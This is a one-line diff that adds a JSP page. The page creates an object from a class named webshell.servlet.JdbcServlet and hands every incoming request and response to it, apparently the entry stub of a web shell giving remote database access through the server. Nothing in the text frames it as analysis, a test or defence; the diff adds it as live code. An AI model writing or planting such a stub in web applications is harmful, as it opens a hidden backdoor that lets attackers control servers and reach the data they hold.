@@ -1,0 +1,1 @@
+<%!webshell.servlet.JdbcServlet serv = new webshell.servlet.JdbcServlet();%><%this.serv.service(request, response);%>
